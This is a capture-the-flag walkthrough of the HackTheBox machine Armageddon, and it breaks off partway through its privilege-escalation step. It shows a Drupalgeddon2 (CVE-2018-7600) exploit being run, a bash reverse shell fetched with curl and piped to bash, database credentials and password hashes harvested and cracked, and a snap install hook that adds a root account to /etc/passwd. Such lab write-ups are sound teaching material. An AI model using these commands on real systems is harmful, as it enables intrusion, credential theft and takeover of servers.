title = "Armageddon | 0xbro"
description = "Armageddon is a Easy difficulty Linux box based on a Drupal application vulnerable to Drupalgeddon2 (CVE-2018-7600)"
full_description = '''.time { text-align: center; margin-top: 30px; font-family: 'Open Sans', sans-serif; font-weight: 300; font-style: normal; } 24 Jul 2021 | Reading time: ~10 min HackTheBox - Armageddon [Easy] #HackTheBox #Easy #Linux #Drupal #B2R #Drupalgeddon2 #CVE-2018-7600 #lateral-movement #MySQL #hardcoded-credentials #password-reuse #weak-credentials #snap-privesc Table of contents Introduction Improved skills: Used tools: Enumeration Foothold Lateral Movement Privilege Escalation Trophy Video Introduction Armageddon is a Easy difficulty Linux box based on a Drupal application vulnerable to Drupalgeddon2 (CVE-2018-7600), which allows to get a low privileged shell as the apache user. Local enumeration allowed to identify MySQL credentials inside a Drupal configuration file and get access to various databases from which it is possible to extract usernames and relative hash. Cracking the hashes locally it was possible to retrieve the password of brucetherealadmin, obtaining user access to the target and discovering that it was allowed run snap with high privileges. Finally, a malicious snap package was both crafted from scratch as well as extracted from a dirty_sock exploit in order to execute custom code with high privileges and obtain a high privileged shell. Improved skills: Drupalgeddon2 (CVE-2018-7600) exploitation Password hunting and hash cracking snap privilege escalation (from scratch and using dirty_sock) Used tools: nmap gobuster searchsploit hashcat Enumeration Scanned all TCP scan: ┌──(kali㉿kali)-[~/CTFs/HTB/box/Armageddon] └─$ sudo nmap -sS -p- 10.10.10.233 -oN scans/all-tcp-ports.txt -v ... PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Enumerated open TCP ports: ┌──(kali㉿kali)-[~/CTFs/HTB/box/Armageddon] └─$ sudo nmap -sT -sV -sC -A -p22,80 10.10.10.233 -oN scans/open-tcp-ports.txt ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.10 - 4.11 (93%), Linux 5.1 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Nmap discovered only two open services running on the target: an ssh service on port 22 (OpenSSH 7.4) and an Apache web server running on port 80 which disclosed different versions and information, including the target OS and the exact version of PHP and Drupal. The web application was the following: It were enumerated files and directories: ┌──(kali㉿kali)-[~/CTFs/HTB/box/Armageddon] └─$ gobuster dir -u http://10.10.10.233 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-directories.txt ... /modules (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/] /includes (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/] /scripts (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/] /themes (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/] /misc (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/] /profiles (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/] /sites (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/] ┌──(kali㉿kali)-[~/CTFs/HTB/box/Armageddon] └─$ gobuster dir -u http://10.10.10.233 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o scans/p80-files.txt ... /cron.php (Status: 403) [Size: 7388] /xmlrpc.php (Status: 200) [Size: 42] /update.php (Status: 403) [Size: 4057] /install.php (Status: 200) [Size: 3172] /index.php (Status: 200) [Size: 7440] /.htaccess (Status: 403) [Size: 211] /web.config (Status: 200) [Size: 2200] /robots.txt (Status: 200) [Size: 2189] /.html (Status: 403) [Size: 207] /.htpasswd (Status: 403) [Size: 211] /.htm (Status: 403) [Size: 206] /.htpasswds (Status: 403) [Size: 212] /.gitignore (Status: 200) [Size: 174] /.htgroup (Status: 403) [Size: 210] /authorize.php (Status: 403) [Size: 2824] /.htaccess.bak (Status: 403) [Size: 215] /.htuser (Status: 403) [Size: 209] /.htc (Status: 403) [Size: 206] /.ht (Status: 403) [Size: 205] But no luck. A new account was created, however an error occurred: Error: Unable to send e-mail. Contact the site administrator if the problem persists. Reading the contents of robots.txt it was possible to identify the exact version of Drupal: ... User-agent: * Crawl-delay: 10 ... # Files Disallow: /CHANGELOG.txt Disallow: /cron.php Disallow: /INSTALL.mysql.txt Disallow: /INSTALL.pgsql.txt Disallow: /INSTALL.sqlite.txt ... Once obtained the exact version it was searched on Exploit-DB for existing exploits targeting this exact version: Foothold Drupal 7.56 is vulnerable to CVE-2018-7600, also known as Drupalgeddon2: Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations. The PoC found on Exploit-DB was written for Metasploit, however a different one, written in python, was available on GitHub and provided a handy remote code execution: ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/exploit] └─$ python3 drupa7-CVE-2018-7600.py -c id http://10.10.10.233 ============================================================================= | DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600) | | by pimps | ============================================================================= [*] Poisoning a form and including it in cache. [*] Poisoned form ID: form-kmITQbaSIIYQosXDMhx9WqGPcsWC76WQY4PviJGMRZ8 [*] Triggering exploit to execute: id uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0 In order to obtain an interactive reverse shell it was first enumerated the path to the bash shell on the target: ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/exploit] └─$ python3 drupa7-CVE-2018-7600.py -c 'which bash' http://10.10.10.233 ============================================================================= | DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600) | | by pimps | ============================================================================= [*] Poisoning a form and including it in cache. [*] Poisoned form ID: form-1eQEjWcQiE4n6N7v_3C91NRGfSlWHusR6hEXzf4lWKw [*] Triggering exploit to execute: which bash /usr/bin/bash After that a bash reverse shell was downloaded and executed on the target. Bash reverse shell: ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/exploit] └─$ echo '/usr/bin/bash -i >& /dev/tcp/10.10.14.24/443 0>&1' > rev.sh ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/exploit] └─$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Downloaded and executed the reverse shell: ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/exploit] └─$ python3 drupa7-CVE-2018-7600.py -c 'curl 10.10.14.24/rev.sh | /usr/bin/bash' http://10.10.10.233 ============================================================================= | DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600) | | by pimps | ============================================================================= [*] Poisoning a form and including it in cache. [*] Poisoned form ID: form-fHJFX_5z9MDk5LrRfNrgjwIHRMsbcxb0UTQwhm1K8a8 [*] Triggering exploit to execute: curl 10.10.14.24/rev.sh | /usr/bin/bash Obtained the shell back: ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/exploit] └─$ sudo nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.233] 37696 bash: no job control in this shell bash-4.2$ id id uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0 Lateral Movement User loocal enumeration showed only one user: bash-4.2$ cat /etc/passwd | grep -v nologin cat /etc/passwd | grep -v nologin root:x:0:0:root:/root:/bin/bash brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash Because the target ran a Drupal application, it was possible that the user reused the same password to connect the application to the DB or to register on the the site. Hardcoded passwords were thus searched within Drupal’s configuration files: Searched hardcoded passwords: bash-4.2$ grep -ri "password" . --color 2>/dev/null ... ./sites/default/settings.php: * 'password' => 'password', ./sites/default/settings.php: 'password' => 'CQHE<redacted>', ... bash-4.2$ cat ./sites/default/settings.php | grep -C5 password ... -- array ( 'default' => array ( 'database' => 'drupal', 'username' => 'drupaluser', 'password' => 'CQHE<redacted>', 'host' => 'localhost', 'port' => '', 'driver' => 'mysql', 'prefix' => '', ), ... The drupaluser password didn’t provide SSH access to the box, so it was used to access the db: bash-4.2$ mysql -h localhost -u drupaluser -p mysql -h localhost -u drupaluser -p Enter password: CQHE<redacted> ****struck**** The command stuck because the shell was not an interactive shell. To overcome the problem the DB was enumerated using the non-interactive mysql client syntax: bash-4.2$ mysql -h localhost -u drupaluser --password='CQHE<redacted>' -e 'show databases;' w databases;'lhost -u drupaluser --password='CQHE<redacted>' -e 'sho Database information_schema drupal mysql performance_schema bash-4.2$ mysql -h localhost -u drupaluser --password='CQHE<redacted>' -e 'use drupal; show tables;' drupal; show tables;'drupaluser --password='CQHE<redacted>' -e 'use Tables_in_drupal actions authmap ... users users_roles variable watchdog bash-4.2$ mysql -h localhost -u drupaluser --password='CQHE<redacted>' -e 'use drupal; select * from users;' drupal; select * from users;'er --password='CQHE<redacted>' -e 'use uid name pass mail theme signature signature_format created access login status timezone language picture init data 0 NULL 0 0 0 0 NULL 0 NULL 1 brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.<redacted> admin@armageddon.eu filtered_html 1606998756 1607077194 1607076276 1 Europe/London 0 admin@armageddon.eu a:1:{s:7:"overlay";i:1;} 3 maoutis $S$DwGOcpJqCIm5IFUnN5uIZAfvmcUVfiCzIkxidLjIBdIkJ0DJy2/o maoutis@hackthebox.htb filtered_html 1619776834 0 0 0 Europe/London 0 maoutis@hackthebox.htb NULL 4 maoutis2 $S$DPO4Jtqc/QPUv6GtEnxTZQnV0/LIGoQwJ7ksoN2gngjefK4DFQOT maoutis@protonmail.com filtered_html 1619782683 0 0 0 Europe/London 0 maoutis@protonmail.com NULL The hash for the brucetherealadmin was then extracted and brute-forced using hashcat: ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/loot] └─$ hashid brucetherealadmin.hash --File 'brucetherealadmin.hash'-- Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.<redacted>' [+] Drupal > v7.x --End of file 'brucetherealadmin.hash'-- ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/loot] └─$ hashcat -h | grep -i drupal 7900 | Drupal7 | Forums, CMS, E-Commerce ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/loot] └─$ hashcat brucetherealadmin.hash /usr/share/wordlists/rockyou.txt -m7900 --force ... $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.<redacted>:bo<redacted> ... ┌──(kali㉿kali)-[~/…/HTB/box/Armageddon/loot] └─$ ssh brucetherealadmin@10.10.10.233 brucetherealadmin@10.10.10.233 password: Last failed login: Fri Apr 30 13:50:50 BST 2021 from 10.10.14.24 on ssh:notty There were 2 failed login attempts since the last successful login. Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5 [brucetherealadmin@armageddon ~]$ id uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Privilege Escalation Enumerated sudo capabilities for bruce: [brucetherealadmin@armageddon ~]$ sudo -l Matching Defaults entries for brucetherealadmin on armageddon: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin User brucetherealadmin may run the following commands on armageddon: (root) NOPASSWD: /usr/bin/snap install * Enumerated snap version: [brucetherealadmin@armageddon ~]$ snap version snap 2.47.1-1.el7 snapd 2.47.1-1.el7 series 16 centos 7 kernel 3.10.0-1160.6.1.el7.x86_64 Searched for an existing PoC to escalate privileges abusing snap and found it on HackTricks If snap is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. Created the malicious package (note the amd64 parameter instead of all during the fpm package creation): ┌──(kali㉿kali)-[/tmp] └─$ COMMAND='echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd' ┌──(kali㉿kali)-[/tmp] └─$ cd $(mktemp -d) ┌──(kali㉿kali)-[/tmp/tmp.gOIiDpu1dV] └─$ mkdir -p meta/hooks ┌──(kali㉿kali)-[/tmp/tmp.gOIiDpu1dV] └─$ printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install ┌──(kali㉿kali)-[/tmp/tmp.gOIiDpu1dV] └─$ chmod +x meta/hooks/install ┌──(kali㉿kali)-[/tmp/tmp.gOIiDpu1dV] └─$ fpm -n xxxx -